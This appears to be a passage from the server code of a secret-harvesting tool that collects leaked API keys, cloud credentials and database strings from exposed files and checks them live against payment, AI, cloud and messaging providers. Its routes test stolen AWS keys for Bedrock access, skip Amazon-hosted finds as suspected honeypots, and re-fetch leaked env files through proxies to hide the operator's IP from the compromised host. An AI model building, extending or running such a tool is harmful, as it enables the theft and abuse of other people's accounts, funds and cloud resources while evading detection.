  stripe:       { category: "payments", url: "https://api.stripe.com/v1/customers?limit=1", headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  paypal:       { category: "payments", url: "https://api-m.paypal.com/v1/identity/oauth2/userinfo?schema=paypalv1.1", headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  braintree:    { category: "payments", url: "https://payments.sandbox.braintree-api.com/graphql",
    method: "POST", headerFn: (k) => ({ Authorization: `Bearer ${k}`, "Braintree-Version": "2019-01-01" }),
    body: { query: "{ ping }" },
  },
  square:       { category: "payments", url: "https://connect.squareup.com/v2/locations",    headerFn: (k) => ({ Authorization: `Bearer ${k}`, "Square-Version": "2024-01-18" }) },
  shopify:      { category: "payments", url: "https://shopify.dev/api", headerFn: (k) => ({ "X-Shopify-Access-Token": k }) },
  paddle:       { category: "payments", url: "https://api.paddle.com/products?per_page=1",    headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  // â”€â”€ Email â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  sendgrid:     { category: "email",    url: "https://api.sendgrid.com/v3/user/email",      headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  mailgun:      { category: "email",    url: "https://api.mailgun.net/v3/domains",
    headerFn: (k) => ({ Authorization: `Basic ${Buffer.from(`api:${k}`).toString("base64")}` }),
  },
  resend:       { category: "email",    url: "https://api.resend.com/domains",              headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  postmark:     { category: "email",    url: "https://api.postmarkapp.com/servers",         headerFn: (k) => ({ "X-Postmark-Account-Token": k }) },
  // â”€â”€ Cloud â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  aws:          { category: "cloud",    url: "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15",
    headerFn: () => ({}),
    requireProxy: true,
  },
  digitalocean: { category: "cloud",   url: "https://api.digitalocean.com/v2/account",     headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  cloudflare:   { category: "cloud",   url: "https://api.cloudflare.com/client/v4/user",   headerFn: (k) => ({ Authorization: `Bearer ${k}` }) },
  // â”€â”€ Auth / Tokens â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  github:       { category: "auth",    url: "https://api.github.com/user",                 headerFn: (k) => ({ Authorization: `Bearer ${k}`, "User-Agent": "KMON-Validator/1.0" }) },
  gitlab:       { category: "auth",    url: "https://gitlab.com/api/v4/user",              headerFn: (k) => ({ "Private-Token": k }) },
  jwt:          { category: "auth",    url: "", headerFn: () => ({}), special: "jwt" },
  // â”€â”€ Messaging â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  telegram:     { category: "messaging", url: "", headerFn: () => ({}), urlFn: (k) => `https://api.telegram.org/bot${k}/getMe` },
  twilio:       { category: "messaging", url: "https://api.twilio.com/2010-04-01/Accounts.json", headerFn: () => ({}) },
  slack_webhook:   { category: "messaging", url: "", headerFn: () => ({}), special: "webhook_url" },
  discord_webhook: { category: "messaging", url: "", headerFn: () => ({}), special: "webhook_url" },
  // â”€â”€ Database â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  postgresql:   { category: "database", url: "", headerFn: () => ({}), special: "connection_string" },
  mysql:        { category: "database", url: "", headerFn: () => ({}), special: "connection_string" },
  mongodb:      { category: "database", url: "", headerFn: () => ({}), special: "connection_string" },
  redis:        { category: "database", url: "", headerFn: () => ({}), special: "connection_string" },
};

// Category display metadata
export const CATEGORY_META: Record<string, { label: string; color: string }> = {
  ai:        { label: "AI",        color: "text-cyan-400" },
  payments:  { label: "Payments",  color: "text-green-400" },
  crypto:    { label: "Crypto",    color: "text-amber-400" },
  email:     { label: "Email",     color: "text-blue-400" },
  cloud:     { label: "Cloud",     color: "text-orange-400" },
  auth:      { label: "Auth",      color: "text-purple-400" },
  messaging: { label: "Messaging", color: "text-yellow-400" },
  storage:   { label: "Storage",   color: "text-pink-400" },
  database:  { label: "Database",  color: "text-red-400" },
  other:     { label: "Other",     color: "text-muted-foreground" },
};

function httpToStatus(code: number): string {
  if (code === 200)                    return "valid";
  if (code === 401 || code === 403)    return "invalid";
  if (code === 429)                    return "rate_limited";
  return "error";
}

function detectService(k: string): string | null {
  // AI
  if (k.startsWith("sk-proj-"))                                    return "openai";
  if (k.startsWith("sk-ant-api03-") || k.startsWith("sk-ant-"))   return "anthropic";
  if (k.startsWith("sk-or-v1-"))                                   return "openrouter";
  if (k.startsWith("AIza"))                                        return "google";
  if (k.startsWith("hf_"))                                         return "huggingface";
  if (k.startsWith("r8_"))                                         return "replicate";
  if (k.startsWith("gsk_"))                                        return "groq";
  if (k.startsWith("pplx-"))                                       return "perplexity";
  if (k.startsWith("CO."))                                         return "cohere";
  if (k.startsWith("msk-"))                                        return "mistral";
  if (k.startsWith("xai-"))                                        return "xai";
  // Payments
  if (k.startsWith("sk_live_") || k.startsWith("sk_test_") ||
      k.startsWith("rk_live_") || k.startsWith("rk_test_"))       return "stripe";
  if (k.startsWith("access_token$production$") ||
      k.startsWith("access_token$sandbox$"))                       return "paypal";
  if (k.startsWith("EAAAE") && k.length > 55)                     return "square";
  if (k.startsWith("sq0") && k.includes("-"))                      return "square";
  if (k.startsWith("shpat_") || k.startsWith("shpss_") ||
      k.startsWith("shpca_"))                                      return "shopify";
  if (k.startsWith("pdl_"))                                        return "paddle";
  // Email
  if (k.startsWith("SG.") && k.includes("."))                      return "sendgrid";
  if (k.startsWith("re_") && k.length > 32)                        return "resend";
  if (k.startsWith("POSTMARK_"))                                   return "postmark";
  // Cloud
  if (k.startsWith("AKIA"))                                        return "aws";
  if (k.startsWith("dop_v1_"))                                     return "digitalocean";
  if (k.startsWith("cf_"))                                         return "cloudflare";
  // Auth
  if (k.startsWith("ghp_") || k.startsWith("gho_") ||
      k.startsWith("ghs_") || k.startsWith("github_pat_"))         return "github";
  if (k.startsWith("glpat-"))                                      return "gitlab";
  if (k.startsWith("eyJ") && k.split(".").length === 3)            return "jwt";
  // Messaging
  if (/^\d{8,10}:AA[A-Za-z0-9_-]{33}/.test(k))                   return "telegram";
  if (k.includes("hooks.slack.com"))                               return "slack_webhook";
  if (k.includes("discord.com/api/webhooks"))                      return "discord_webhook";
  // Database
  if (k.startsWith("postgres://") || k.startsWith("postgresql://")) return "postgresql";
  if (k.startsWith("mysql://") || k.startsWith("mysql2://"))       return "mysql";
  if (k.startsWith("mongodb://") || k.startsWith("mongodb+srv://")) return "mongodb";
  if (k.startsWith("redis://") || k.startsWith("rediss://"))       return "redis";
  // Chinese AI providers
  if (/^[a-f0-9]{16}\.[A-Za-z0-9]{32,48}$/.test(k))               return "zhipuai";
  // Fallback: old OpenAI keys
  if (k.startsWith("sk-") && k.length === 51)                      return "openai";
  return null;
}

// â”€â”€ Router â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

export function buildMonitorRouter() {
  // Start the Python monitor process
  startMonitor();

  // Load Amazon IP ranges for honeypot detection (background)
  void refreshAmazonRanges();
  setInterval(() => { void refreshAmazonRanges(); }, 24 * 3600 * 1000);

  // Initial cache population — runs at startup BEFORE the HTTP server starts accepting
  // requests, so the blocking read happens during init, not during serving.
  // Periodic refresh: every 5 min to pick up new keys from Go scanner.
  // After auto-purge the file is ~3MB, so reads take ~30ms (acceptable).
  refreshKeysCache();
  setInterval(refreshKeysCache, 5 * 60_000);

  const router = Router();

  // GET /monitor/status
  router.get("/status", (req, res) => {
    const status = readJson(STATUS_FILE, {
      running: false,
      current_action: "startingâ€¦",
      last_cycle_at: null,
      next_run_at: null,
      seconds_until_next: 0,
      cycle_in_progress: false,
      stats: {},
    }) as Record<string, unknown>;

    const cp = (status.cycle_progress ?? {}) as Record<string, unknown>;
    const done = Number(cp.done ?? 0);
    const total = Number(cp.total ?? 0);
    const startedAt = (cp.started_at as string | null) ?? null;
    // Prefer the sliding-window rate the scanner publishes (last ~60s).
    // Falls back to cumulative rate if the field isn't there yet (older
    // status files written before the window was tracked).
    const rateRecent = typeof cp.rate_recent_per_sec === "number"
      ? (cp.rate_recent_per_sec as number)
      : null;
    const currentCategory = typeof cp.current_category === "string"
      ? (cp.current_category as string)
      : null;
    let etaSeconds: number | null = null;
    if (startedAt && done > 0 && total > done) {
      let rate = rateRecent ?? 0;
      if (rate <= 0) {
        const elapsed = (Date.now() - new Date(startedAt).getTime()) / 1000;
        if (elapsed > 0) rate = done / elapsed;
      }
      if (rate > 0) etaSeconds = Math.round((total - done) / rate);
    }
    res.json({
      running: status.running ?? (monitorProcess !== null && !monitorProcess.killed),
      currentAction: status.current_action ?? "startingâ€¦",
      lastCycleAt: status.last_cycle_at ?? null,
      nextRunAt: status.next_run_at ?? null,
      secondsUntilNext: (status.seconds_until_next as number) ?? 0,
      cycleInProgress: status.cycle_in_progress ?? false,
      cycleProgress: { done, total, startedAt, etaSeconds, currentCategory },
    });
  });

  // GET /monitor/stats
  router.get("/stats", (req, res) => {
    const status = readJson(STATUS_FILE, { stats: {} }) as Record<string, unknown>;
    const settings = readJson(SETTINGS_FILE, { queries: [] }) as Record<string, unknown>;
    const sources = readJson(SOURCES_FILE, []) as Record<string, unknown>[];
    const stats = (status.stats ?? {}) as Record<string, unknown>;

    // Use in-memory cache (non-blocking) instead of readKeysDedup() (blocks 2-5s)
    const now = Date.now();
    if (!_statsCache || now - _statsCache.ts > STATS_CACHE_TTL_MS) {
      const allKeys = keysFromCache(); // O(1), non-blocking
      const keysFound = allKeys.length;
      const keysValid = allKeys.filter((k) => k.status === "valid").length;
      const keysInvalid = allKeys.filter((k) => k.status === "invalid").length;
      const keysUnchecked = allKeys.filter((k) => !k.status || k.status === "unchecked").length;
      const keysWithBedrock = allKeys.filter((k) => k.aws_bedrock_access === true).length;
      const serviceBreakdown: Record<string, number> = {};
      const categoryBreakdown: Record<string, number> = {};
      for (const k of allKeys) {
        const svc = String(k.service ?? "unknown");
        serviceBreakdown[svc] = (serviceBreakdown[svc] ?? 0) + 1;
        const cat = String(k.category ?? "other");
        categoryBreakdown[cat] = (categoryBreakdown[cat] ?? 0) + 1;
      }
      _statsCache = {
        data: { keysFound, keysValid, keysInvalid, keysUnchecked, keysWithBedrock, serviceBreakdown, categoryBreakdown },
        ts: now,
      };
    }

    res.json({
      totalCycles: stats.cycles ?? 0,
      totalNew: stats.new ?? 0,
      totalSeen: stats.seen_total ?? 0,
      totalErrors: stats.errors ?? 0,
      totalSources: sources.filter((s) => s.enabled !== false).length,
      totalQueries: ((settings.queries as string[]) ?? []).length,
      ..._statsCache.data,
    });
  });

  // GET /monitor/results
  router.get("/results", (req, res) => {
    const isExport = req.query.export === "1";
    const page = Math.max(1, parseInt(String(req.query.page ?? "1")));
    const limit = isExport
      ? 999999
      : Math.min(200, Math.max(1, parseInt(String(req.query.limit ?? "50"))));
    const typeFilter = String(req.query.type ?? "all");
    const serviceFilter = String(req.query.service ?? "");
    const categoryFilter = String(req.query.category ?? "");
    const statusFilter = String(req.query.status ?? "all");
    const sourceFilter = String(req.query.source ?? "");
    const keySearch = String(req.query.keySearch ?? "").trim();
    const bedrockOnly = req.query.bedrock === "1";

    // Use in-memory cache (non-blocking) instead of readKeysDedup() (blocks 2-5s per call).
    // keysFromCache() is O(1); the cache is refreshed every 5 min by refreshKeysCache()
    // and updated in real-time by appendKeyValidation().
    const keys = keysFromCache().map(normalizeResult);
    const urls = readJsonl(RESULTS_FILE).map(normalizeResult);

    let combined: Record<string, unknown>[] = [];
    if (typeFilter === "keys") combined = keys;
    else if (typeFilter === "urls") combined = urls;
    else {
      const seenIds = new Set<string>();
      for (const r of [...keys, ...urls]) {
        const id = r.id as string;
        if (!seenIds.has(id)) { seenIds.add(id); combined.push(r); }
      }
    }

    if (categoryFilter && categoryFilter !== "all") {
      combined = combined.filter((r) => r.category === categoryFilter);
    }
    if (serviceFilter && serviceFilter !== "all") {
      combined = combined.filter((r) => r.service === serviceFilter);
    }
    if (statusFilter && statusFilter !== "all") {
      combined = combined.filter((r) => r.status === statusFilter);
    }
    if (bedrockOnly) {
      combined = combined.filter((r) => r.awsBedrockAccess === true);
    }
    if (sourceFilter && sourceFilter !== "all") {
      combined = combined.filter((r) =>
        String(r.source ?? "").toLowerCase().includes(sourceFilter.toLowerCase())
      );
    }
    if (keySearch) {
      const needle = keySearch.toLowerCase();
      combined = combined.filter((r) =>
        String(r.key ?? r.keyMasked ?? "").toLowerCase().includes(needle) ||
        String(r.url ?? "").toLowerCase().includes(needle)
      );
    }

    // Sort newest first
    combined.sort((a, b) => {
      const da = String(a.firstSeenAt ?? a.publishedAt ?? "");
      const db = String(b.firstSeenAt ?? b.publishedAt ?? "");
      return db.localeCompare(da);
    });

    const total = combined.length;
    const pages = Math.ceil(total / limit);
    const items = isExport ? combined : combined.slice((page - 1) * limit, page * limit);

    res.json({ items, total, page, limit, pages });
  });

  // GET /monitor/results/new
  router.get("/results/new", (req, res) => {
    const newKeys = keysFromCache()   // O(1) cache, non-blocking
      .map(normalizeResult)
      .slice(-50)
      .reverse();
    const newUrls = readJsonl(NEW_RESULTS_FILE)
      .map(normalizeResult)
      .slice(-50)
      .reverse();

    const seenIds = new Set<string>();
    const combined: Record<string, unknown>[] = [];
    for (const r of [...newKeys, ...newUrls]) {
      const id = r.id as string;
      if (!seenIds.has(id)) { seenIds.add(id); combined.push(r); }
    }
    combined.sort((a, b) =>
      String(b.firstSeenAt ?? "").localeCompare(String(a.firstSeenAt ?? ""))
    );
    res.json(combined.slice(0, 50));
  });

  // POST /monitor/cycle
  router.post("/cycle", (req, res) => {
    try {
      ensureDataDir();
      fs.writeFileSync(TRIGGER_FILE, Date.now().toString());
      // Also restart process if it died
      if (!monitorProcess || monitorProcess.killed) startMonitor();
      res.json({ success: true, message: "Cycle triggered" });
    } catch (err) {
      res.json({ success: false, message: String(err) });
    }
  });

  // Shared validation helper â€” calls the API and writes result back to KEYS_FILE
  async function performValidation(id: string): Promise<{ status: string; message: string }> {
    // O(1) cache lookup — avoids reading the entire 75MB file just to find one record
    const rawTarget = _keysBaseCache.get(id) ?? null;
    if (!rawTarget || !rawTarget.key || !rawTarget.service) {
      return { status: "error", message: "Key not found or not validatable" };
    }
    const target = normalizeResult(rawTarget);

    const validator = PROVIDER_VALIDATORS[String(target.service)];
    if (!validator) {
      return { status: "error", message: `No validator for '${target.service}'` };
    }

    const write = (statusVal: string, message: string, extra?: Record<string, unknown>) => {
      updateJsonlRecord(KEYS_FILE, id, {
        status: statusVal,
        validated_at: new Date().toISOString(),
        ...(extra ?? {}),
      });
      return { status: statusVal, message };
    };

    // Special validators that don't use HTTP
    if (validator.special === "jwt") {
      const parts = String(target.key).split(".");
      return write(parts.length === 3 ? "valid" : "invalid", parts.length === 3 ? "Valid JWT structure" : "Invalid JWT structure");
    }
    if (validator.special === "connection_string" || validator.special === "webhook_url") {
      return write("error", `Cannot validate ${validator.special} remotely â€” check manually`);
    }

    const key = String(target.key);
    const proxy = getRandomUserProxy();

    // If this validator requires a proxy but none is configured, defer.
    if (validator.requireProxy && !proxy) {
      return { status: "unchecked", message: "Deferred: proxy required but none configured" };
    }

    // â”€â”€ AWS: SigV4 + Bedrock â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if (String(target.service) === "aws") {
      if (!proxy) {
        return { status: "unchecked", message: "Deferred: proxy required for AWS validation" };
      }

      // Only AKIA access keys can be used for STS
      if (!key.startsWith("AKIA")) {
        return write("unchecked", "AWS secret key stored without paired access key ID");
      }

      // ── Amazon-hosted IP check (honeypot traps) ───────────────────────────
      // Client rule: if IP belongs to Amazon ASN → always honeypot, no exceptions.
      // Even STS-validated keys from Amazon IPs are traps — attackers create REAL
      // IAM keys with minimal permissions specifically to catch scanners.
      const hostIp = extractHostIp(rawTarget);
      if (hostIp && isAmazonHost(hostIp)) {
        return write("honeypot", `Amazon-hosted IP (${hostIp}) — planted honeypot, skipping STS`, {
          amazon_hosted: true,
          validated_at: new Date().toISOString(),
        });
      }

      // Try to get the secret from snippet (120-140 chars around the match)
      let secret = extractAwsSecret(String(target.snippet ?? ""));

      // Build the fullest available text for token extraction
      let fullText = String(target.snippet ?? "");

      // If snippet secret is shorter than 40 chars, look up full content from env_found.jsonl
      if (secret.length < 40) {
        const fullContent = getEnvFoundContent(String(target.url ?? ""));
        if (fullContent) {
          if (!fullText) fullText = fullContent;
          const s2 = extractAwsSecret(fullContent);
          if (s2.length >= 40) secret = s2;
        }
      }

      // Bedrock API key in env (ABSK format) â€” this IS Bedrock access
      let bedrockToken = extractAwsBedrockToken(fullText);
      if (!bedrockToken) {
        const fullContent = getEnvFoundContent(String(target.url ?? ""));
        if (fullContent) bedrockToken = extractAwsBedrockToken(fullContent);
      }

      if (!secret || secret.length < 39) {
        // Can't validate via STS without full secret.
        // But if a Bedrock token exists, still record Bedrock access on the record.
        if (bedrockToken) {
          return write("unchecked", `AWS secret truncated, but Bedrock API key found â€” will backfill Bedrock flag`, {
            aws_bedrock_token: bedrockToken,
            aws_bedrock_access: true,
            aws_bedrock_checked_at: new Date().toISOString(),
          });
        }
        return write("unchecked", "AWS secret key not found in env snippet (truncated?)");
      }

      try {
        const { status: stsStatus, accountId, arn, keyType } = await performAwsValidation(key, secret, proxy);

        if (stsStatus === 200) {
          // Bedrock: EITHER IAM permission OR ABSK token in env (both = valid Bedrock access)
          let bedrockAccess = bedrockToken.length > 0; // ABSK token present = Bedrock available
          if (!bedrockAccess) {
            // No ABSK token → try IAM check (slower, network call)
            try {
              bedrockAccess = await checkBedrockAccess(key, secret, proxy);
            } catch { /* Bedrock check failure doesn't affect key validity */ }
          }

          return write("valid", `STS OK — Account: ${accountId} | ARN: ${arn} | Bedrock: ${bedrockAccess ? "YES" : "NO"}`, {
            aws_account_id: accountId,
            aws_arn: arn,
            aws_key_type: keyType,
            aws_bedrock_token: bedrockToken || null,
            aws_bedrock_access: bedrockAccess,
            bedrock_iam_verified: true,
            aws_bedrock_checked_at: new Date().toISOString(),
          });
        } else if (stsStatus === 403) {
          return write("invalid", "STS rejected â€” invalid or revoked credentials (HTTP 403)");
        } else if (stsStatus === 401) {
          return write("invalid", "STS rejected â€” unauthorized (HTTP 401)");
        } else if (stsStatus === 429) {
          return write("rate_limited", "STS rate limited (HTTP 429)");
        } else {
          return write("error", `STS unexpected response: HTTP ${stsStatus}`);
        }
      } catch (err) {
        return write("error", `AWS STS error: ${String(err)}`);
      }
    }

    // â”€â”€ Standard HTTP validator â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    const url = validator.urlFn ? validator.urlFn(key) : validator.url;
    if (!url) return write("error", "Validator has no URL configured");

    try {
      let statusCode: number;
      if (proxy) {
        const resp = await fetchViaProxy(url, {
          method: validator.method ?? "GET",
          headers: validator.headerFn(key) as Record<string, string>,
          body: validator.body ? JSON.stringify(validator.body) : undefined,
          timeoutMs: 15000,
        }, proxy);
        statusCode = resp.status;
      } else {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 10000);
        const resp = await fetch(url, {
          method: validator.method ?? "GET",
          headers: {
            ...(validator.method === "POST" ? { "Content-Type": "application/json" } : {}),
            ...validator.headerFn(key),
          },
          body: validator.body ? JSON.stringify(validator.body) : undefined,
          signal: controller.signal,
        });
        clearTimeout(timer);
        statusCode = resp.status;
      }
      const statusVal = httpToStatus(statusCode);
      return write(statusVal, `HTTP ${statusCode}${proxy ? " (proxy)" : ""}`);
    } catch (err) {
      return write("error", String(err));
    }
  }

  // GET /monitor/results/:id â€” full detail for a single key
  // Uses grep (native C) to find the matching line in 200MB KEYS_FILE fast (~0.2s).
  // grep -m1 stops at first match; fingerprints are hex so shell-safe after validation.
  // ?? Delete by filter ? MUST be before /results/:id ?????????????????????????
  router.get("/results/count-by-filter", (req, res) => {
    const host    = String(req.query.host    ?? "").trim();
    const service = String(req.query.service ?? "").trim();
    if (!host && !service) { res.status(400).json({ error: "host or service required" }); return; }
    try {
      let total = 0; let valid = 0;
      const rl = readline.createInterface({
        input: fs.createReadStream(KEYS_FILE, { encoding: "utf-8" }),
        crlfDelay: Infinity,
      });
      rl.on("line", (line: string) => {
        if (!line.trim()) return;
        try {
          const r = JSON.parse(line) as Record<string,unknown>;
          const urlStr = String(r.url ?? r.query ?? "");
          const matchHost    = !host    || urlStr.includes(host);
          const matchService = !service || String(r.service ?? "") === service;
          if (matchHost && matchService) { total++; if (r.status === "valid") valid++; }
        } catch { /* skip */ }
      });
      rl.on("close", () => res.json({ total, valid, host, service }));
      rl.on("error", (e: Error) => res.status(500).json({ error: String(e) }));
    } catch (err) { res.status(500).json({ error: String(err) }); }
  });

  router.delete("/results/by-filter", (req, res) => {
    const host    = String(req.query.host    ?? "").trim();
    const service = String(req.query.service ?? "").trim();
    if (!host && !service) { res.status(400).json({ error: "host or service required" }); return; }
    try {
      const lines = fs.existsSync(KEYS_FILE)
        ? fs.readFileSync(KEYS_FILE, "utf-8").trim().split("\n").filter(Boolean)
        : [];
      const kept: string[] = [];
      let removed = 0;
      for (const line of lines) {
        try {
          const r = JSON.parse(line) as Record<string,unknown>;
          const urlStr = String(r.url ?? r.query ?? "");
          const matchH = host    ? urlStr.includes(host)                : false;
          const matchS = service ? String(r.service ?? "") === service  : false;
          if (matchH || matchS) { removed++; } else { kept.push(line); }
        } catch { kept.push(line); }
      }
      const tmp = KEYS_FILE + ".tmp." + process.pid;
      fs.writeFileSync(tmp, kept.join("\n") + (kept.length ? "\n" : ""));
      fs.renameSync(tmp, KEYS_FILE);
      invalidateStatsCache();
      res.json({ success: true, removed, kept: kept.length });
    } catch (err) { res.status(500).json({ error: String(err) }); }
  });

  router.get("/results/:id", (req, res) => {
    const { id } = req.params;

    // Validate id is a safe hex fingerprint (prevents shell injection)
    if (!/^[0-9a-f]{24,64}$/.test(id)) {
      res.status(400).json({ error: "Invalid id" }); return;
    }

    // grep -m1: stop at first match; tac: search from end (newest entries last)
    // Fingerprints appear in multiple lines due to append-only validation â€”
    // we want the LAST (most up-to-date) occurrence.
    let raw: Record<string, unknown> | null = null;
    try {
      const grepOut = execSync(
        `tac "${KEYS_FILE}" | grep -m1 '"fingerprint":"${id}"'`,
        { encoding: "utf-8", maxBuffer: 4 * 1024 * 1024 }
      ).trim();
      if (grepOut) raw = JSON.parse(grepOut) as Record<string, unknown>;
    } catch { /* not found or parse error */ }

    if (!raw) { res.status(404).json({ error: "Not found" }); return; }

    const item = normalizeResult(raw);

    // If this is an ENV scanner entry (has run_id), grep env_found.jsonl for context
    let envDetail: Record<string, unknown> | null = null;
    const runId = String(raw.run_id ?? "");
    const itemUrl = String(item.url ?? "");
    if (runId && /^[0-9a-f\-]+$/.test(runId)) {
      const ENV_FOUND_FILE = path.join(DATA_DIR, "env_found.jsonl");
      try {
        const grepOut2 = execSync(
          `grep -m1 '"run_id":"${runId}"' "${ENV_FOUND_FILE}"`,
          { encoding: "utf-8", maxBuffer: 4 * 1024 * 1024 }
        ).trim();
        if (grepOut2) {
          const e = JSON.parse(grepOut2) as Record<string, unknown>;
          const q = String(item.query ?? "");
          const urlMatch = itemUrl && String(e.url ?? "") === itemUrl;
          const hostMatch = q && String(e.host ?? "") === q;
          if (urlMatch || hostMatch || !itemUrl) {
            envDetail = {
              host: e.host ?? null,
              path: e.path ?? null,
              url: e.url ?? null,
              mode: e.mode ?? null,
              contentPreview: e.content_preview ?? null,
              contentLength: e.content_length ?? null,
              keysFound: e.keys_found ?? 0,
              keyCategories: e.key_categories ?? [],
              keyServices: e.key_services ?? [],
              foundAt: e.found_at ?? null,
            };
          }
        }
      } catch { /* not found */ }
    }

    // Fallback: if no envDetail yet, grep env_found.jsonl directly by URL
    if (!envDetail && itemUrl) {
      const ENV_FOUND_FILE = path.join(DATA_DIR, "env_found.jsonl");
      try {
        const grepOut2 = execSync(
          `grep -F -m1 ${JSON.stringify(itemUrl)} "${ENV_FOUND_FILE}"`,
          { encoding: "utf-8", maxBuffer: 4 * 1024 * 1024 }
        ).trim();
        if (grepOut2) {
          const e = JSON.parse(grepOut2) as Record<string, unknown>;
          envDetail = {
            host: e.host ?? null,
            path: e.path ?? null,
            url: e.url ?? null,
            mode: e.mode ?? null,
            contentPreview: e.content_preview ?? null,
            contentLength: e.content_length ?? null,
            keysFound: e.keys_found ?? 0,
            keyCategories: e.key_categories ?? [],
            keyServices: e.key_services ?? [],
            foundAt: e.found_at ?? null,
          };
        }
      } catch { /* not found */ }
    }

    res.json({ ...item, runId: runId || null, envDetail });
  });

  // POST /monitor/results/:id/live-content â€” re-fetch the leaked URL to get
  // the FULL content (snippet is truncated, env_found may be cleaned up).
  router.post("/results/:id/live-content", async (req, res) => {
    const { id } = req.params;
    if (!/^[0-9a-f]{24,64}$/.test(id)) {
      res.status(400).json({ error: "Invalid id" }); return;
    }

    // Find record via grep (same approach as detail endpoint)
    let raw: Record<string, unknown> | null = null;
    try {
      const grepOut = execSync(
        `tac "${KEYS_FILE}" | grep -m1 '"fingerprint":"${id}"'`,
        { encoding: "utf-8", maxBuffer: 4 * 1024 * 1024 }
      ).trim();
      if (grepOut) raw = JSON.parse(grepOut) as Record<string, unknown>;
    } catch { /* not found */ }

    if (!raw) { res.status(404).json({ error: "Not found" }); return; }
    const url = String(raw.url ?? "");
    if (!url) { res.status(404).json({ error: "No URL in record" }); return; }

    let timer: ReturnType<typeof setTimeout> | null = null;
    try {
      const proxy = getRandomUserProxy();
      const controller = new AbortController();
      timer = setTimeout(() => controller.abort(), 12000);
      let fetchOpts: RequestInit = { signal: controller.signal, redirect: "follow" };
      if (proxy) {
        // For live re-fetch of leaked env files, always use the proxy if available
        // (avoids exposing our IP to the compromised host)
        const agent = new HttpsProxyAgent(proxy);
        const parsed = new URL(url);
        const isHttps = parsed.protocol === "https:";
        if (isHttps) {
          const body = await new Promise<string>((resolve, reject) => {
            const lib = https;
            const req2 = lib.request({
              hostname: parsed.hostname,
              port: parsed.port || "443",
              path: parsed.pathname + parsed.search,
              method: "GET",
              headers: { "User-Agent": "Mozilla/5.0 (compatible; kmon/1.0)" },
              agent,
              timeout: 10000,
            }, (resp) => {
              const chunks: Buffer[] = [];
              resp.on("data", (c: Buffer) => chunks.push(c));
              resp.on("end", () => resolve(Buffer.concat(chunks).toString("utf-8")));
            });
            req2.on("timeout", () => { req2.destroy(); reject(new Error("timeout")); });
            req2.on("error", reject);
            req2.end();
          });
          if (timer) clearTimeout(timer);
          res.json({ url, content: body.slice(0, 50_000), viaProxy: true });
          return;
        }
      }
      const resp = await fetch(url, fetchOpts);
      if (timer) clearTimeout(timer);
      const text = await resp.text();
      res.json({ url, content: text.slice(0, 50_000), status: resp.status, viaProxy: false });
    } catch (e) {
      if (timer) clearTimeout(timer);
      res.status(502).json({ error: String(e) });
    }
  });

  // POST /monitor/validate/:id
  router.post("/validate/:id", async (req, res) => {
    const { id } = req.params;
    const result = await performValidation(id);
    res.json({ id, ...result });
  });

  // Background auto-validate: check unchecked keys every 45 s when auto_validate=true.
  // Processes up to 20 keys per cycle in parallel groups of 5, sorted newest-first
  // so freshly-found keys get validated before older backlog entries.
  async function runAutoValidate() {
    try {
      const settings = readJson(SETTINGS_FILE, {}) as Record<string, unknown>;
      if (settings.auto_validate === false) return;
      // Use in-memory cache (non-blocking) instead of readKeysDedup() (blocks 1-3s)
      const pending = keysFromCache()
        .map(normalizeResult)
        .filter(
          (k) => (!k.status || k.status === "unchecked") &&
                  k.key && k.service &&
                  PROVIDER_VALIDATORS[String(k.service)]
        )
        .sort((a, b) => String(b.firstSeenAt ?? "").localeCompare(String(a.firstSeenAt ?? "")))
